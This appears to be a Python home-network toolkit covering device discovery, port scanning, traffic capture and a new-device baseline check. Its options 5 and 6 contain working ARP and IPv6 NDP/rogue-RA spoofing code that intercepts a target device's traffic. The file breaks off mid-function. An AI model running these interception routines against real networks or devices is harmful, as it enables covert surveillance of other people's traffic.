#!/usr/bin/env python3
"""
lan-toolkit.py  -  Home network tinkering toolkit (cross-platform)
------------------------------------------------------------------
Legitimate network admin / security learning for devices and networks
YOU OWN. Do not use against networks or devices that are not yours.

Standard library only - no pip installs needed.
Works on Windows, macOS and Linux.

Run:   python lan-toolkit.py
Some steps work best in an admin/root shell (packet capture, OS scan).
"""

import concurrent.futures as cf
import json
import os
import platform
import re
import shutil
import socket
import subprocess
import sys
import threading
import time

# scapy is needed ONLY for the ARP intercept lab (menu option 5). It is
# imported lazily inside that function, so the rest of this stdlib-only
# toolkit works without it.  Install with:  pip install scapy

IS_WIN = platform.system() == "Windows"
HOME = os.path.expanduser("~")


# ----------------------------------------------------------------------
# Network auto-detection
# ----------------------------------------------------------------------
def local_ip():
    """Find this machine's LAN IP by opening a throwaway UDP socket."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))   # no packets actually sent for UDP
        return s.getsockname()[0]
    except OSError:
        return "127.0.0.1"
    finally:
        s.close()


def default_gateway(prefix):
    """Best-effort gateway detection; falls back to <prefix>1."""
    try:
        if IS_WIN:
            out = subprocess.run(["ipconfig"], capture_output=True, text=True).stdout
            m = re.search(r"Default Gateway[ .]*: ?([\d.]+)", out)
            if m:
                return m.group(1)
        else:
            out = subprocess.run(["ip", "route"], capture_output=True, text=True).stdout
            m = re.search(r"default via ([\d.]+)", out)
            if m:
                return m.group(1)
    except Exception:
        pass
    return prefix + "1"


def get_net():
    ip = local_ip()
    prefix = ip.rsplit(".", 1)[0] + "."
    return {"ip": ip, "prefix": prefix, "gateway": default_gateway(prefix)}


def find_tool(name, extra_paths):
    p = shutil.which(name)
    if p:
        return p
    for cand in extra_paths:
        if os.path.exists(cand):
            return cand
    return None


def find_nmap():
    return find_tool("nmap", [
        r"C:\Program Files (x86)\Nmap\nmap.exe",
        r"C:\Program Files\Nmap\nmap.exe",
    ])


def find_wireshark():
    return find_tool("wireshark", [
        r"C:\Program Files\Wireshark\Wireshark.exe",
        r"/Applications/Wireshark.app/Contents/MacOS/Wireshark",
    ])


def find_tshark():
    return find_tool("tshark", [
        r"C:\Program Files\Wireshark\tshark.exe",
        r"/Applications/Wireshark.app/Contents/MacOS/tshark",
    ])


def wifi_interface(tshark):
    """Return the tshark interface number whose name looks like Wi-Fi."""
    out = subprocess.run([tshark, "-D"], capture_output=True, text=True).stdout
    for line in out.splitlines():
        if re.search(r"wi-?fi|wlan|wireless|airport|en0", line, re.I):
            m = re.match(r"\s*(\d+)\.", line)
            if m:
                return m.group(1)
    return None


# ----------------------------------------------------------------------
# STEP 1 - Discover devices
# ----------------------------------------------------------------------
def ping(host):
    if IS_WIN:
        cmd = ["ping", "-n", "1", "-w", "300", host]
    else:
        cmd = ["ping", "-c", "1", "-W", "1", host]
    return subprocess.run(cmd, capture_output=True).returncode == 0


def ping_sweep(prefix):
    hosts = [f"{prefix}{i}" for i in range(1, 255)]
    alive = []
    with cf.ThreadPoolExecutor(max_workers=64) as ex:
        for host, ok in zip(hosts, ex.map(ping, hosts)):
            if ok:
                alive.append(host)
    return alive


def arp_table(prefix):
    """Return {ip: mac} from the OS ARP cache."""
    out = subprocess.run(["arp", "-a"], capture_output=True, text=True).stdout
    table = {}
    for line in out.splitlines():
        if prefix not in line:
            continue
        ipm = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})", line)
        macm = re.search(r"([0-9a-fA-F]{2}([:-])[0-9a-fA-F]{2}(?:\2[0-9a-fA-F]{2}){4})", line)
        if ipm and macm:
            ip = ipm.group(1)
            mac = macm.group(1).lower().replace("-", ":")
            # skip broadcast / multicast entries
            if ip.endswith(".255") or mac == "ff:ff:ff:ff:ff:ff":
                continue
            octet = int(ip.split(".")[0])
            if 224 <= octet <= 239:   # multicast range
                continue
            table[ip] = mac
    return table


def hostname_for(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except (socket.herror, socket.gaierror, OSError):
        return "-"


def is_private_mac(mac):
    """Randomized / locally-administered MAC: 2nd hex digit in {2,6,a,e}."""
    try:
        return mac[1].lower() in "26ae"
    except IndexError:
        return False


def discover_devices(net):
    """Ping-sweep + ARP + name resolution. Returns rows, no printing."""
    ping_sweep(net["prefix"])
    table = arp_table(net["prefix"])
    table.setdefault(net["ip"], "(this pc)")   # ensure we list ourselves
    rows = []
    for ip in sorted(table, key=lambda x: int(x.split(".")[-1])):
        mac = table[ip]
        note = "ROUTER" if ip == net["gateway"] else ("THIS PC" if ip == net["ip"] else "")
        priv = "yes" if is_private_mac(mac) else "no"
        rows.append((ip, mac, hostname_for(ip), priv, note))
    return rows


def print_devices(rows, indent=""):
    print(f"{indent}{'IP':<16}{'MAC':<20}{'NAME':<22}{'PRIV':<6}NOTE")
    print(f"{indent}{'-' * 62}")
    for ip, mac, name, priv, note in rows:
        print(f"{indent}{ip:<16}{mac:<20}{name[:21]:<22}{priv:<6}{note}")


def step_discover(net):
    print(f"\n[Step 1] Discovering devices on {net['prefix']}0/24 ...")
    print("Pinging 254 addresses...\n")
    rows = discover_devices(net)
    print_devices(rows)
    return rows


# ----------------------------------------------------------------------
# STEP 2 - Port scan
# ----------------------------------------------------------------------
# Single source of truth: ports we scan for, with friendly labels.
# Any port NOT here still gets a name via the OS services file (port_name).
PORTS = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns", 80: "http",
    110: "pop3", 139: "file-share", 143: "imap", 443: "https", 445: "smb",
    554: "rtsp/cam", 1883: "mqtt", 3389: "rdp", 5000: "upnp", 5900: "vnc",
    8000: "dev-server", 8080: "http-alt", 8009: "chromecast", 8443: "https-alt",
    9100: "printer", 32400: "plex",
}


def port_name(port):
    """Friendly label for a port: curated map first, then the OS services file."""
    if port in PORTS:
        return PORTS[port]
    try:
        return socket.getservbyport(port)      # from /etc/services or Windows equivalent
    except OSError:
        return "?"


def scan_port(ip, port, timeout=0.6):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        return port if s.connect_ex((ip, port)) == 0 else None


def scan_common(ip):
    """Return a sorted list of open common ports on ip."""
    open_ports = []
    with cf.ThreadPoolExecutor(max_workers=50) as ex:
        futs = {ex.submit(scan_port, ip, p): p for p in PORTS}
        for fut in cf.as_completed(futs):
            r = fut.result()
            if r:
                open_ports.append(r)
    return sorted(open_ports)


def builtin_scan(ip):
    print(f"\n[Step 2] Built-in scan of {ip} ({len(PORTS)} common ports)...")
    open_ports = scan_common(ip)
    if not open_ports:
        print("  All scanned ports closed (typical for a phone/client device).")
    for p in open_ports:
        print(f"  {p:<6} open   {port_name(p)}")


def step_portscan(net):
    target = input(f"Target IP [blank = scan whole {net['prefix']}0/24]: ").strip()
    nmap = find_nmap()
    if nmap:
        tgt = target or f"{net['prefix']}0/24"
        print(f"\n[Step 2] nmap service scan of {tgt} (top 100 ports)...")
        subprocess.run([nmap, "-sV", "-T4", "--top-ports", "100", tgt])
    else:
        print("nmap not found - using built-in scanner (single host only).")
        builtin_scan(target or net["gateway"])


# ----------------------------------------------------------------------
# STEP 3 - Read traffic
# ----------------------------------------------------------------------
def step_traffic(net):
    print("\n[Step 3] Reading traffic")
    print("""You see THIS machine's unicast traffic, PLUS everyone's multicast/
broadcast (e.g. mDNS '.local' names other devices announce). HTTPS
payloads are encrypted - you see WHICH hosts, not the contents.
""")
    print("  a) 15s DNS capture       (domains being looked up)")
    print("  b) 15s connections       (which servers this PC connects to - TLS SNI)")
    print("  c) Launch Wireshark GUI")
    sub = input("Choose a/b/c [a]: ").strip().lower() or "a"

    if sub == "c":
        ws = find_wireshark()
        if ws:
            print("Launching Wireshark - pick your Wi-Fi adapter and double-click it.")
            print("Useful filters:  dns  |  http  |  tls.handshake.type==1  |  ip.addr == <ip>")
            subprocess.Popen([ws])
        else:
            print("Wireshark not found. Install: winget install WiresharkFoundation.Wireshark")
        return

    tshark = find_tshark()
    if not tshark:
        print("tshark not found (comes with Wireshark). Install Wireshark first.")
        return
    iface = wifi_interface(tshark)
    if not iface:
        subprocess.run([tshark, "-D"])
        iface = input("Enter the Wi-Fi interface number from the list above: ").strip()

    if sub == "b":
        # TLS ClientHello carries the destination server name (SNI) in clear text
        print(f"\nCapturing HTTPS connections for 15s on interface {iface} ...")
        print("(browse something on this PC to see more)\n")
        print(f"{'DEST IP':<17}{'PORT':<6}SERVER")
        print("-" * 55)
        fields = ["-e", "ip.dst", "-e", "tcp.dstport",
                  "-e", "tls.handshake.extensions_server_name"]
        disp = "tls.handshake.type==1"
    else:
        print(f"\nCapturing DNS queries for 15s on interface {iface} ...")
        print("(browse something on this PC to see more)\n")
        print(f"{'SOURCE':<16}DOMAIN")
        print("-" * 50)
        fields = ["-e", "ip.src", "-e", "dns.qry.name"]
        disp = "dns.flags.response==0"

    try:
        subprocess.run([tshark, "-i", iface, "-a", "duration:15", "-n",
                        "-Y", disp, "-T", "fields"] + fields)
    except Exception as e:
        print(f"Capture failed ({e}). Npcap may need an admin shell.")


# ----------------------------------------------------------------------
# STEP 4 - Remote access helpers
# ----------------------------------------------------------------------
def _listening_ports():
    """Return ['139 file-share', '445 smb', ...] for curated ports this PC listens on."""
    out = subprocess.run(["netstat", "-an"], capture_output=True, text=True).stdout
    seen = set()
    for line in out.splitlines():
        if "LISTEN" not in line.upper():
            continue
        parts = line.split()
        local = parts[1] if len(parts) > 1 else ""   # local address column
        m = re.search(r"[:.](\d+)$", local)
        if m and int(m.group(1)) in PORTS:           # only curated server ports (avoid noise)
            seen.add(int(m.group(1)))
    return [f"{p} {port_name(p)}" for p in sorted(seen)]


def step_remote(net):
    print("\n[Step 4] Remote access to your own devices")
    print(f"""  SSH out:        ssh user@<ip>
  Remote Desktop: mstsc /v:<ip>   (target must be Windows Pro+ with RDP on)
  Router admin:   http://{net['gateway']}
""")

    print("This machine's remote-access tools:")
    print(f"  SSH client: {'yes' if shutil.which('ssh') else 'no'}")
    if IS_WIN:
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                               r"System\CurrentControlSet\Control\Terminal Server")
            deny = winreg.QueryValueEx(k, "fDenyTSConnections")[0]
            print(f"  RDP host (incoming): {'enabled' if deny == 0 else 'disabled'}"
                  "  (note: Windows Home cannot host RDP)")
        except OSError:
            pass

    print("\nThis machine's listening services:")
    listening = _listening_ports()
    if listening:
        for item in listening:
            print(f"  port {item}")
    else:
        print("  (no common server ports listening - this PC is a pure client)")


# ----------------------------------------------------------------------
# STEP 5 - ARP man-in-the-middle LAB   (YOUR OWN network & devices ONLY)
# ----------------------------------------------------------------------
# Intercepts ONE device's traffic via ARP spoofing so you can see which
# servers it connects to (TLS SNI). This is a real interception technique
# - only run it against devices you own on a network you own. It enables
# IP forwarding so the target keeps internet, and RESTORES every change
# (both ARP tables + forwarding) when it stops.

def _fwd_alias():
    """InterfaceAlias of the interface that holds the default route."""
    ps = ("Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway} | "
          "Select-Object -First 1 -ExpandProperty InterfaceAlias")
    try:
        return subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                              capture_output=True, text=True).stdout.strip() or "Wi-Fi"
    except Exception:
        return "Wi-Fi"


def _set_forwarding(alias, state, family="IPv4"):
    if IS_WIN:
        subprocess.run(["powershell", "-NoProfile", "-Command",
                        f"Set-NetIPInterface -InterfaceAlias '{alias}' "
                        f"-AddressFamily {family} -Forwarding {state}"],
                       capture_output=True, text=True)


def _ipv6_gateway():
    """Link-local address of the IPv6 default router (fe80::...), or None."""
    if not IS_WIN:
        return None
    ps = ("Get-NetRoute -DestinationPrefix '::/0' -ErrorAction SilentlyContinue | "
          "Select-Object -First 1 -ExpandProperty NextHop")
    try:
        gw = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                            capture_output=True, text=True).stdout.strip()
        return gw or None
    except Exception:
        return None


def _ipv6_neighbors(net_prefix_unused=None):
    """Reachable IPv6 neighbors as [(ip6, mac), ...] (excludes link-local fe80)."""
    if not IS_WIN:
        return []
    ps = ("Get-NetNeighbor -AddressFamily IPv6 -ErrorAction SilentlyContinue | "
          "Where-Object {$_.State -in 'Reachable','Stale' -and "
          "$_.IPAddress -notlike 'fe80*' -and $_.LinkLayerAddress} | "
          "ForEach-Object {\"$($_.IPAddress)=$($_.LinkLayerAddress)\"}")
    try:
        out = subprocess.run(["powershell", "-NoProfile", "-Command", ps],
                             capture_output=True, text=True).stdout
        res = []
        for line in out.splitlines():
            if "=" in line:
                ip6, mac = line.strip().split("=", 1)
                res.append((ip6, mac.lower().replace("-", ":")))
        return res
    except Exception:
        return []


# ----------------------------------------------------------------------
# Fallback: identify WHO owns a destination IP when the name is hidden
# (ECH / Private Relay / VPN). Uses reverse-DNS + Team Cymru's free
# IP-to-ASN DNS service (no API key). Names may be gone, but the IP isn't.
# ----------------------------------------------------------------------
def _ip_lookup(ip):
    """Return (reverse_dns, 'ASnnnn Org') for an IP; either part may be ''."""
    rdns = ""
    try:
        rdns = socket.gethostbyaddr(ip)[0]
    except Exception:
        pass
    asn_org = ""
    try:
        if "." in ip:   # IPv4 only for the Cymru origin lookup (keeps it simple)
            rev = ".".join(reversed(ip.split("."))) + ".origin.asn.cymru.com"
            txt = subprocess.run(["nslookup", "-type=TXT", rev],
                                 capture_output=True, text=True, timeout=5).stdout
            m = re.search(r'"\s*(\d+)\s*\|', txt)       # 1st field = ASN
            if m:
                asn = m.group(1)
                txt2 = subprocess.run(["nslookup", "-type=TXT", f"AS{asn}.asn.cymru.com"],
                                      capture_output=True, text=True, timeout=5).stdout
                mo = re.search(r'"([^"]*\|[^"]*)"', txt2)
                org = mo.group(1).split("|")[-1].strip() if mo else ""
                asn_org = f"AS{asn} {org}".strip()
    except Exception:
        pass
    return rdns, asn_org


def ip_org(ip):
    rdns, asn_org = _ip_lookup(ip)
    parts = [p for p in (rdns, asn_org) if p]
    return "  |  ".join(parts) if parts else "?"


def _flows_to_seen(cap, target):
    """tshark lines 'dst<TAB>sni' -> [(sni, dst), ...], one per destination IP,
    keeping any SNI seen for that IP (so already-open flows appear with no SNI).
    Some packets carry multiple ip.dst values (comma-joined, e.g. the target's
    own IP in an embedded header) - pick the external one and drop the target."""
    flows = {}   # dst -> best sni ("" if none seen)
    for line in cap.splitlines():
        parts = line.split("\t")
        if not parts or not parts[0].strip():
            continue
        dsts = [d.strip() for d in parts[0].split(",") if d.strip()]
        dst = next((d for d in dsts if d != target), "")
        if not dst:
            continue
        sni = parts[1].strip() if len(parts) > 1 else ""
        if dst not in flows or (sni and not flows[dst]):
            flows[dst] = sni
    return [(sni, dst) for dst, sni in flows.items()]


def _report_capture(seen, target, fname):
    """Organise captured flows into two clear groups:
      1. NAMED  - connections whose SNI was visible (plaintext hostname)
      2. HIDDEN - no SNI (ECH/relay/established); identified by IP owner,
                  grouped by organisation so one owner = one block.
    Prints a readable report and saves the same structure to Downloads/<fname>."""
    named = sorted({(sni, dst) for sni, dst in seen if sni})
    hidden_ips = sorted({dst for sni, dst in seen if not sni})

    groups = {}   # "ASnnnn Org" -> [(ip, rdns), ...]
    for ip in hidden_ips:
        rdns, org = _ip_lookup(ip)
        groups.setdefault(org or "(unknown owner)", []).append((ip, rdns))

    lines = []
    lines.append(f"Intercept of {target}   {time.strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append(f"{len(named)} named  +  {len(hidden_ips)} hidden "
                 f"across {len(groups)} owners")
    lines.append("")
    lines.append("NAMED  (plaintext SNI - exact hostname visible)")
    lines.append("-" * 60)
    if named:
        for sni, dst in named:
            lines.append(f"  {sni:<42}{dst}")
    else:
        lines.append("  (none)")
    lines.append("")
    lines.append("HIDDEN  (no SNI - identified by IP owner)")
    lines.append("-" * 60)
    if groups:
        for org in sorted(groups):
            ips = groups[org]
            lines.append(f"  {org}")
            for ip, rdns in ips:
                lines.append(f"      {ip:<16}{rdns}")
    else:
        lines.append("  (none)")

    print("\n".join("  " + ln for ln in lines))
    try:
        with open(os.path.join(HOME, "Downloads", fname), "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
    except OSError:
        pass


def step_arp(net, target=None):
    print("\n[Step 5] ARP MAN-IN-THE-MIDDLE LAB  (YOUR OWN devices only)")
    print("""Spoofs ONE device so its traffic flows through this PC, then shows
which servers it connects to (TLS SNI). Use ONLY on your own network
and your own devices. Everything is restored when it stops.""")

    if target is None:
        target = input("\nTarget device IP (e.g. your phone): ").strip()
    else:
        target = target.strip()
        print(f"\nTarget: {target}")
    if not re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
        print("  Not a valid IP."); return
    if not target.startswith(net["prefix"]):
        print(f"  {target} is not on your network ({net['prefix']}0/24). Aborting."); return
    if target in (net["ip"], net["gateway"]):
        print("  Refusing to target this PC or the router."); return

    try:
        from scapy.all import ARP, Ether, srp, sendp, conf
    except ImportError:
        print("  Needs scapy:  pip install scapy"); return

    gw = net["gateway"]
    try:
        conf.iface = conf.route.route(target)[0]     # use the iface that reaches the LAN
    except Exception:
        pass

    def mac_of(ip):
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                     timeout=2, retry=2, verbose=0)
        return ans[0][1].hwsrc if ans else None

    print("\nResolving MAC addresses ...")
    try:
        t_mac, g_mac = mac_of(target), mac_of(gw)
    except Exception as e:
        print(f"  Packet access failed: {e}")
        print("  Raw injection needs an ADMIN shell (+ Npcap). Re-run elevated."); return
    if not t_mac or not g_mac:
        print(f"  Could not resolve MACs (target={t_mac}, gateway={g_mac}).")
        print("  Make sure the device is awake and on this network."); return
    print(f"  target  {target:<15} = {t_mac}")
    print(f"  gateway {gw:<15} = {g_mac}")

    alias = _fwd_alias()
    print(f"\nEnabling IP forwarding on '{alias}' (keeps {target} online)...")
    _set_forwarding(alias, "Enabled")

    stop = threading.Event()

    def poison():
        # tell target WE are the gateway, and tell gateway WE are the target
        pkt_t = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw)
        pkt_g = Ether(dst=g_mac) / ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target)
        while not stop.is_set():
            sendp(pkt_t, verbose=0)
            sendp(pkt_g, verbose=0)
            stop.wait(2)

    th = threading.Thread(target=poison, daemon=True)
    th.start()
    print("Spoofing active. Capturing the target's HTTPS server names for 20s...")
    print("(make sure the device is doing something - e.g. a video playing)\n")

    tshark = find_tshark()
    iface = wifi_interface(tshark) if tshark else None
    try:
        if not (tshark and iface):
            print("  tshark/Wi-Fi interface not found - cannot show SNI.")
            return
        # Capture ALL 443 traffic from the target (not just handshakes), so
        # ALREADY-OPEN connections show up too - their data packets still
        # reveal the destination IP, which we resolve via ip_org().
        cap = subprocess.run(
            [tshark, "-i", iface, "-a", "duration:20", "-n",
             "-Y", f"ip.src=={target} && (tcp.port==443 || udp.port==443)",
             "-T", "fields", "-e", "ip.dst",
             "-e", "tls.handshake.extensions_server_name"],
            capture_output=True, text=True).stdout
        seen = _flows_to_seen(cap, target)
        _report_capture(seen, target, "arp-sni.txt")   # name if handshake seen, else IP->org
    finally:
        print("\nStopping spoof and RESTORING the network ...")
        stop.set()
        th.join(timeout=3)
        # Send the CORRECT mappings back to both sides, many times with small
        # gaps, so a device that cached the poisoned entry is sure to re-learn
        # the real MAC BEFORE we remove forwarding (otherwise it black-holes).
        fix_t = Ether(dst=t_mac) / ARP(op=2, pdst=target, hwdst=t_mac, psrc=gw, hwsrc=g_mac)
        fix_g = Ether(dst=g_mac) / ARP(op=2, pdst=gw, hwdst=g_mac, psrc=target, hwsrc=t_mac)
        for _ in range(15):
            sendp(fix_t, verbose=0)
            sendp(fix_g, verbose=0)
            time.sleep(0.2)
        _set_forwarding(alias, "Disabled")   # remove forwarding only after re-learning
        print("  ARP tables restored, IP forwarding disabled. Done.")


# ----------------------------------------------------------------------
# STEP 6 - NDP / RA spoofing (IPv6 MITM)   YOUR OWN network & devices ONLY
# ----------------------------------------------------------------------
# IPv6 has no ARP; neighbors are found via NDP (ICMPv6 Neighbor Discovery).
# The IPv6 analog of ARP spoofing is:
#   * NA (Neighbor Advertisement) spoofing - poison a neighbor cache entry,
#     claiming the gateway's IPv6 is at OUR MAC (and vice-versa to the gw).
#   * (optional) rogue RA (Router Advertisement) - announce US as a router,
#     which can also push our DNS via the RDNSS option.
# Note: ARP spoofing does NOTHING to IPv6 traffic, and NDP spoofing does
# nothing to IPv4 - a dual-stack device needs BOTH to be fully intercepted.

def step_ndp(net, target=None):
    print("\n[Step 6] NDP / RA SPOOFING - IPv6 MITM  (YOUR OWN devices only)")
    print("""IPv6 version of the ARP lab: poisons a device's NEIGHBOR cache (and
optionally sends a rogue Router Advertisement) so its IPv6 traffic flows
through this PC. Only on your own network/devices. Restored on exit.""")

    gw6 = _ipv6_gateway()
    if not gw6:
        print("\n  No IPv6 default router on this network - there is no IPv6 to")
        print("  intercept here. (This network is IPv4-only; use option 5 / --arp.)")
        return

    try:
        from scapy.all import (Ether, IPv6, ICMPv6ND_NA, ICMPv6ND_RA,
                               ICMPv6NDOptDstLLAddr, ICMPv6NDOptSrcLLAddr,
                               ICMPv6NDOptRDNSS, getmacbyip6, sendp, conf)
    except ImportError:
        print("  Needs scapy:  pip install scapy"); return

    if target is None:
        neighbors = _ipv6_neighbors()
        if not neighbors:
            print("  No IPv6 neighbors found to target."); return
        print("\nSelect an IPv6 device to intercept (YOUR OWN devices only):")
        for idx, (ip6, mac) in enumerate(neighbors, 1):
            print(f"  {idx}) {ip6:<34} {mac}")
        choice = input("Number (blank to cancel): ").strip()
        if not choice.isdigit() or not (1 <= int(choice) <= len(neighbors)):
            print("  Cancelled."); return
        target = neighbors[int(choice) - 1][0]
    print(f"\nTarget (IPv6): {target}")
    if target == gw6:
        print("  Refusing to target the router."); return

    try:
        conf.iface = conf.route6.route(target)[0]
    except Exception:
        pass

    print("\nResolving link-layer (MAC) addresses via NDP ...")
    try:
        t_mac = getmacbyip6(target)
        g_mac = getmacbyip6(gw6)
    except Exception as e:
        print(f"  Packet access failed: {e}")
        print("  Raw injection needs an ADMIN shell (+ Npcap). Re-run elevated."); return
    if not t_mac or not g_mac:
        print(f"  Could not resolve MACs (target={t_mac}, gateway={g_mac})."); return
    my_mac = Ether().src
    print(f"  target  {target}  = {t_mac}")
    print(f"  gateway {gw6}  = {g_mac}")

    alias = _fwd_alias()
    print(f"\nEnabling IPv6 forwarding on '{alias}' (keeps {target} online)...")
    _set_forwarding(alias, "Enabled", family="IPv6")

    stop = threading.Event()

    def poison():
        # Spoofed NA: "<spoofed IP> is at MY MAC", Override flag set.
        na_to_target = (Ether(dst=t_mac) / IPv6(src=gw6, dst=target) /
                        ICMPv6ND_NA(tgt=gw6, R=1, S=0, O=1) /
                        ICMPv6NDOptDstLLAddr(lladdr=my_mac))
        na_to_gw = (Ether(dst=g_mac) / IPv6(src=target, dst=gw6) /
                    ICMPv6ND_NA(tgt=target, R=0, S=0, O=1) /
                    ICMPv6NDOptDstLLAddr(lladdr=my_mac))
        # Optional rogue RA pushing us as router + our DNS (RDNSS)
        ra = (Ether(dst=t_mac) / IPv6(dst=target) /
              ICMPv6ND_RA(routerlifetime=1800) /
              ICMPv6NDOptSrcLLAddr(lladdr=my_mac))
        while not stop.is_set():
            sendp(na_to_target, verbose=0)
            sendp(na_to_gw, verbose=0)
            sendp(ra, verbose=0)
            stop.wait(2)

    th = threading.Thread(target=poison, daemon=True)
    th.start()
    print("Spoofing active. Capturing the target's IPv6 HTTPS server names for 20s...\n")

    tshark = find_tshark()
    iface = wifi_interface(tshark) if tshark else None
    seen = []
    try:
        if not (tshark and iface):
            print("  tshark/Wi-Fi interface not found - cannot show SNI."); return
        cap = subprocess.run(
            [tshark, "-i", iface, "-a", "duration:20", "-n",
             "-Y", f"ipv6.src=={target} && (tcp.port==443 || udp.port==443)",
             "-T", "fields", "-e", "ipv6.dst",
             "-e", "tls.handshake.extensions_server_name"],
            capture_output=True, text=True).stdout
        seen = _flows_to_seen(cap, target)
        _report_capture(seen, target, "ndp-sni.txt")   # name if handshake seen, else IP->org
    finally:
        print("\nStopping spoof and RESTORING the network ...")
        stop.set()
        th.join(timeout=3)
        # Correct NAs: re-advertise the REAL MACs so caches re-learn before
        # we drop forwarding.
        fix_t = (Ether(dst=t_mac) / IPv6(src=gw6, dst=target) /
                 ICMPv6ND_NA(tgt=gw6, R=1, S=0, O=1) /
                 ICMPv6NDOptDstLLAddr(lladdr=g_mac))
        fix_g = (Ether(dst=g_mac) / IPv6(src=target, dst=gw6) /
                 ICMPv6ND_NA(tgt=target, R=0, S=0, O=1) /
                 ICMPv6NDOptDstLLAddr(lladdr=t_mac))
        for _ in range(15):
            sendp(fix_t, verbose=0)
            sendp(fix_g, verbose=0)
            time.sleep(0.2)
        _set_forwarding(alias, "Disabled", family="IPv6")
        print("  Neighbor caches restored, IPv6 forwarding disabled. Done.")


# ----------------------------------------------------------------------
# JSON baseline helpers (used by the auto report)
# ----------------------------------------------------------------------
def _load_json(path):
    try:
        with open(path, encoding="utf-8") as f:
            return json.load(f)
    except (OSError, ValueError):
        return None


def _save_json(path, data):
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
    except OSError:
        pass


# ----------------------------------------------------------------------
# Menu
# ----------------------------------------------------------------------
MENU = """
  1) Discover devices on the network
  2) Port scan a device (nmap, or built-in fallback)
  3) Read traffic (Wireshark)
  4) Remote access helpers
  5) ARP intercept lab   (IPv4, your own devices only)
  6) NDP/RA intercept    (IPv6, your own devices only)
  q) Quit
"""


BAR = "=" * 64


def section(title):
    print(f"\n{title}")
    print("-" * 64)


def auto_report(net):
    """Run every step on its own, print a clean report, and exit. No prompts."""
    stamp = time.strftime("%Y-%m-%d %H:%M:%S")
    print(BAR)
    print(f"  LAN NETWORK REPORT{' ' * 24}{time.strftime('%Y-%m-%d %H:%M')}")
    print(f"  This PC: {net['ip']}     Router: {net['gateway']}")
    print(BAR)

    # --- [1] Discover devices ---
    section("[1] DEVICES ON THE NETWORK")
    print("  Scanning 254 addresses ...\n")
    rows = discover_devices(net)
    print_devices(rows, indent="  ")

    # --- [2] Port scan every device (compact, one line each) ---
    section("[2] OPEN PORTS  (common-port scan of each device)")
    for ip, mac, name, priv, note in rows:
        if mac == "(this pc)":
            print(f"  {ip:<16}{'THIS PC':<12}(skipped)")
            continue
        ports = scan_common(ip)
        label = note or ("device")
        if ports:
            desc = "  ".join(f"{p}({port_name(p)})" for p in ports)
        else:
            desc = "- none open (client device)"
        print(f"  {ip:<16}{label:<12}{desc}")

    # --- [3] DNS traffic (10s live capture) ---
    section("[3] DNS TRAFFIC  (10s live capture - domains looked up now)")
    tshark = find_tshark()
    iface = wifi_interface(tshark) if tshark else None
    if not tshark:
        print("  tshark not found - skipping (install Wireshark to enable).")
    elif not iface:
        print("  No Wi-Fi capture interface found - skipping.")
    else:
        try:
            cap = subprocess.run(
                [tshark, "-i", iface, "-a", "duration:10", "-n",
                 "-Y", "dns.flags.response==0", "-T", "fields",
                 "-e", "ip.src", "-e", "dns.qry.name"],
                capture_output=True, text=True).stdout
            seen = []
            for line in cap.splitlines():
                parts = line.split("\t")
                if len(parts) != 2 or not parts[0] or not parts[1]:
                    continue
                src = parts[0]
                dom = parts[1].split(",")[0]          # first name if several
                if dom.endswith(".local"):
                    dom += "  (mDNS)"                  # local service discovery
                if (src, dom) not in seen:
                    seen.append((src, dom))
            if seen:
                for src, dom in seen:
                    print(f"  {src:<16}-> {dom}")
            else:
                print("  (no DNS lookups during this 10s window - try while browsing)")
        except Exception as e:
            print(f"  capture skipped ({e})")

    # --- [4] Remote access snapshot ---
    section("[4] REMOTE ACCESS  (this PC)")
    print(f"  SSH client : {'yes' if shutil.which('ssh') else 'no'}")
    if IS_WIN:
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                               r"System\CurrentControlSet\Control\Terminal Server")
            deny = winreg.QueryValueEx(k, "fDenyTSConnections")[0]
            note = "" if deny else "  "
            print(f"  RDP host   : {'enabled' if deny == 0 else 'disabled'}"
                  f"  (Windows Home cannot host RDP)")
        except OSError:
            pass
    listening = _listening_ports()
    print(f"  Listening  : {', '.join(listening) if listening else 'none (pure client)'}")
    print(f"  Router UI  : http://{net['gateway']}")

    # --- [5] Baseline check (new / unknown devices) ---
    section("[5] BASELINE CHECK  (new devices since last run)")
    base_path = os.path.join(HOME, "Downloads", "lan-known-devices.json")
    known = _load_json(base_path) or {}
    current = {mac: ip for ip, mac, *_ in rows if mac != "(this pc)"}
    new = [m for m in current if m not in known]
    if not known:
        print("  First run - saved current devices as the baseline.")
    elif new:
        print(f"  *** {len(new)} NEW / UNKNOWN device(s): ***")
        for m in new:
            print(f"      {current[m]:<16}{m}")
        print("  Investigate with:  python lan-toolkit.py --menu  (option 2)")
    else:
        print("  All devices match the baseline. Nothing new.")
    for ip, mac, name, *_ in rows:
        if mac != "(this pc)" and mac not in known:
            known[mac] = {"name": name, "ip": ip, "first_seen": stamp}
    _save_json(base_path, known)

    print(f"\n{BAR}")
    print(f"  Report complete.   (menu mode:  python lan-toolkit.py --menu)")
    print(BAR)


def run_menu(net):
    print("================ LAN Toolkit (Python) ================")
    print(f" This machine: {net['ip']}   Router: {net['gateway']}")
    print("======================================================")
    actions = {
        "1": step_discover, "2": step_portscan, "3": step_traffic,
        "4": step_remote, "5": step_arp, "6": step_ndp,
    }
    while True:
        print(MENU)
        choice = input("Choose: ").strip().lower()
        if choice == "q":
            break
        action = actions.get(choice)
        if action:
            try:
                action(net)
            except Exception as e:
                print(f"Error: {e}")
        else:
            print("Pick 1-6 or q.")


def _pick_target(net):
